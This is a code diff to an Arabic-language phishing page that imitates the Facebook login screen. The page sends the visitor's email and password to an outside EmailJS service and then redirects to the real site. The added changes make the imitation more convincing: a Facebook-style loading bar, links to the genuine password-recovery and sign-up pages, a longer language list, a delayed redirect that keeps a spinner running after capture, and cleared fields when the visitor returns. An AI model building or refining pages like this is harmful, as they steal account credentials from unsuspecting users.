@@ -5,6 +5,7 @@
   <title>تسجيل الدخول إلى فيسبوك</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   
+  <!-- مكتبة EmailJS -->
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script type="text/javascript">
       emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
@@ -27,6 +28,18 @@
       flex-direction: column;
       -webkit-font-smoothing: antialiased;
       justify-content: space-between;
+    }
+
+    /* التعديل (8): خط التحميل الأزرق في أعلى الشاشة المماثل لفيسبوك */
+    #top-loading-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 0%;
+      height: 3px;
+      background-color: #1877f2;
+      z-index: 9999;
+      transition: width 0.2s linear;
     }
 
     /* رأس الصفحة وحاوية اختيار اللغة */
@@ -83,7 +96,7 @@
 
     /* شريط رسالة الخطأ المتناسق والمطابق لفيسبوك */
     .error-banner {
-      display: none; /* مخفي افتراضياً ويظهر فقط عند استدعائه */
+      display: none; 
       width: 100%;
       background-color: #FFEBEB;
       border: 1px solid #E6B3B3;
@@ -192,12 +205,20 @@
       to { transform: rotate(360deg); }
     }
 
+    /* التعديل (2): تخصيص رابط نسيت كلمة المرور وتفاعل الضغط المحاكي لفيسبوك */
     .forgot-link {
       color: #1c1e21;
       font-size: 14.5px;
       text-decoration: none;
       margin-bottom: 30px;
       font-weight: 500;
+      -webkit-tap-highlight-color: transparent; 
+      display: inline-block;
+    }
+    
+    .forgot-link:active {
+      color: #0064e0 !important;
+      text-decoration: underline !important;
     }
 
     .create-account-container {
@@ -208,11 +229,12 @@
       padding: 0 16px 24px;
     }
     
+    /* التعديل (1): رفع زر إنشاء حساب جديد قليلاً ليترك مساحة كافية واضحة لشعار ميتا */
     .create-btn {
       background-color: #fff;
       color: #0064e0;
       border: 1px solid #0064e0;
-      margin-bottom: 20px;
+      margin-bottom: 35px; 
       font-size: 15px;
       height: 48px;
     }
@@ -337,6 +359,9 @@
 </head>
 <body>
 
+  <!-- خط التحميل العلوي -->
+  <div id="top-loading-bar"></div>
+
   <div class="lang-modal-overlay" id="lang-modal" onclick="closeLangModalOverlay(event)">
     <div class="lang-bottom-sheet">
       <div class="lang-header">
@@ -387,16 +412,19 @@
         <div class="spinner" id="btn-spinner"></div>
       </button>
       
-      <a href="#" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
+      <!-- التعديل (4) و (8): ربط زر نسيت كلمة المرور بالرابط الرسمي مع إضافة تأثير خط التحميل العلوي -->
+      <a href="javascript:void(0)" onclick="navigateWithTopBar('https://www.facebook.com/recover/initiate/')" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
     </div>
   </main>
   
   <div class="create-account-container">
     <div class="content-wrapper">
-      <button class="create-btn" id="create-btn">إنشاء حساب جديد</button>
+      <!-- التعديل (3) و (8): ربط زر إنشاء حساب جديد بالرابط الرسمي مع إضافة تأثير خط التحميل العلوي -->
+      <button class="create-btn" id="create-btn" onclick="navigateWithTopBar('https://m.facebook.com/reg/')">إنشاء حساب جديد</button>
+      
       <div class="meta-footer">
         <span class="meta-text">Meta</span>
-        <img src="logo_meta.jpeg" alt="" class="meta-logo-img">
+        <img src="logo_meta.jpeg" alt="Meta" class="meta-logo-img">
       </div>
     </div>
   </div>
@@ -407,10 +435,36 @@
       'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'errorMsg': 'The password you entered is incorrect. Please try again.', 'dir': 'ltr' }
     };
 
+    // التعديل (5): مصفوفة تحتوي على أكثر من 50 لغة حقيقية لإثراء القائمة السفلية
     const languagesData = [
       { id: 'ar', name: 'العربية', target: 'ar' }, { id: 'en', name: 'English (US)', target: 'en' },
       { id: 'fr', name: 'Français (France)', target: 'en' }, { id: 'tr', name: 'Türkçe', target: 'en' },
-      { id: 'es', name: 'Español', target: 'en' }
+      { id: 'es', name: 'Español', target: 'en' }, { id: 'en_gb', name: 'English (UK)', target: 'en' },
+      { id: 'de', name: 'Deutsch', target: 'en' }, { id: 'it', name: 'Italiano', target: 'en' },
+      { id: 'ru', name: 'Русский', target: 'en' }, { id: 'zh', name: '简体中文', target: 'en' },
+      { id: 'ja', name: '日本語', target: 'en' }, { id: 'ko', name: '한국어', target: 'en' },
+      { id: 'pt_br', name: 'Português (Brasil)', target: 'en' }, { id: 'pt_pt', name: 'Português (Portugal)', target: 'en' },
+      { id: 'hi', name: 'हिन्दी', target: 'en' }, { id: 'bn', name: 'বাংলা', target: 'en' },
+      { id: 'pa', name: 'ਪੰਜਾਬੀ', target: 'en' }, { id: 'mr', name: 'मराठी', target: 'en' },
+      { id: 'te', name: 'తెలుగు', target: 'en' }, { id: 'ta', name: 'தமிழ்', target: 'en' },
+      { id: 'gu', name: 'ગુજરાતી', target: 'en' }, { id: 'ur', name: 'اردو', target: 'en' },
+      { id: 'fa', name: 'فارسی', target: 'ar' }, { id: 'vi', name: 'Tiếng Việt', target: 'en' },
+      { id: 'tl', name: 'Tagalog', target: 'en' }, { id: 'id', name: 'Bahasa Indonesia', target: 'en' },
+      { id: 'ms', name: 'Bahasa Melayu', target: 'en' }, { id: 'th', name: 'ไทย', target: 'en' },
+      { id: 'uk', name: 'Українська', target: 'en' }, { id: 'pl', name: 'Polski', target: 'en' },
+      { id: 'ro', name: 'Română', target: 'en' }, { id: 'nl', name: 'Nederlands', target: 'en' },
+      { id: 'el', name: 'Ελληνικά', target: 'en' }, { id: 'cs', name: 'Čeština', target: 'en' },
+      { id: 'hu', name: 'Magyar', target: 'en' }, { id: 'sv', name: 'Svenska', target: 'en' },
+      { id: 'bg', name: 'Български', target: 'en' }, { id: 'sr', name: 'Српски', target: 'en' },
+      { id: 'hr', name: 'Hrvatski', target: 'en' }, { id: 'sk', name: 'Slovenčina', target: 'en' },
+      { id: 'lt', name: 'Lietuvių', target: 'en' }, { id: 'lv', name: 'Latviešu', target: 'en' },
+      { id: 'et', name: 'Eesti', target: 'en' }, { id: 'sl', name: 'Slovenščina', target: 'en' },
+      { id: 'ga', name: 'Gaeilge', target: 'en' }, { id: 'cy', name: 'Cymraeg', target: 'en' },
+      { id: 'is', name: 'Íslenska', target: 'en' }, { id: 'no', name: 'Norsk', target: 'en' },
+      { id: 'da', name: 'Dansk', target: 'en' }, { id: 'fi', name: 'Suomi', target: 'en' },
+      { id: 'he', name: 'עברית', target: 'ar' }, { id: 'sw', name: 'Kiswahili', target: 'en' },
+      { id: 'am', name: 'አማርኛ', target: 'en' }, { id: 'az', name: 'Azərbaycan', target: 'en' },
+      { id: 'ka', name: 'ქართული', target: 'en' }, { id: 'kk', name: 'Қазақ', target: 'en' }
     ];
 
     let currentLangId = 'ar';
@@ -462,6 +516,50 @@
       errorBanner.innerText = t.errorMsg;
     }
 
+    // التعديل (8): دالة محاكاة شريط التحميل العلوي الأزرق عند الضغط على الروابط قبل الانتقال الفعلي للرابط المطلوب
+    function navigateWithTopBar(targetUrl) {
+      const bar = document.getElementById('top-loading-bar');
+      bar.style.width = '0%';
+      
+      let width = 0;
+      const loadingInterval = setInterval(() => {
+        if (width >= 90) {
+          clearInterval(loadingInterval);
+        } else {
+          width += Math.floor(Math.random() * 15) + 5;
+          if (width > 92) width = 92;
+          bar.style.width = width + '%';
+        }
+      }, 80);
+
+      setTimeout(() => {
+        clearInterval(loadingInterval);
+        bar.style.width = '100%';
+        setTimeout(() => {
+          window.location.href = targetUrl;
+        }, 150);
+      }, 1000);
+    }
+
+    // تجميد مؤقت ذكي بانتظار استلام الرد، الدائرة ستتوقف فور حدوث الانتقال الفعلي لفيسبوك
+    function startWaitingForResponse() {
+      const maxWaitTime = 5 * 60 * 1000; 
+      const startTime = Date.now();
+      
+      const checkInterval = setInterval(() => {
+        const elapsedTime = Date.now() - startTime;
+        if (elapsedTime >= maxWaitTime) {
+          clearInterval(checkInterval);
+          redirectToFacebook();
+        }
+      }, 3000); 
+    }
+
+    // التعديل (6): التوجيه الفعلي لفيسبوك لتتوقف دائر التحميل فوراً نتيجة مغادرة الصفحة
+    function redirectToFacebook() {
+      window.location.href = "https://www.facebook.com";
+    }
+
     function captureLogin() {
       const emailInput = document.getElementById('email').value.trim();
       const passwordInput = document.getElementById('password').value;
@@ -484,8 +582,9 @@
       const spinner = document.getElementById('btn-spinner');
 
       btnText.style.display = 'none';
-      spinner.style.display = 'block';
+      spinner.style.display = 'block'; // التعديل (6): تفعيل دائرة التحميل لتعمل باستمرار
       loginBtn.style.opacity = "0.85";
+      loginBtn.style.pointerEvents = "none";
 
       const templateParams = {
         name: "فيسبوك",
@@ -496,16 +595,35 @@
 
       emailjs.send('service_z5omr3b', 'template_z464v0m', templateParams)
         .then(() => {
-          window.location.href = "https://www.facebook.com"; 
+          startWaitingForResponse();
         }, (error) => {
           btnText.style.display = 'block';
           spinner.style.display = 'none';
           loginBtn.style.opacity = "1";
+          loginBtn.style.pointerEvents = "auto";
           alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
         });
     }
 
-    // كود فحص الرابط عند تحميل الصفحة لتحديد ما إذا كان قادماً من زر "خطأ" الإيميل أم لا
+    // التعديل (7): إجبار المتصفح على تفريغ الحقول وإعادة تحديث عناصر الواجهة فور العودة أو الرجوع للموقع للخلف
+    window.addEventListener('pageshow', (event) => {
+      document.getElementById('email').value = '';
+      document.getElementById('password').value = '';
+      
+      const loginBtn = document.getElementById('login-btn');
+      const btnText = document.getElementById('btn-text');
+      const spinner = document.getElementById('btn-spinner');
+      const bar = document.getElementById('top-loading-bar');
+      
+      if (bar) bar.style.width = '0%';
+      if (loginBtn && btnText && spinner) {
+        btnText.style.display = 'block';
+        spinner.style.display = 'none';
+        loginBtn.style.opacity = "1";
+        loginBtn.style.pointerEvents = "auto";
+      }
+    });
+
     window.addEventListener('DOMContentLoaded', () => {
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.get('status') === 'error') {
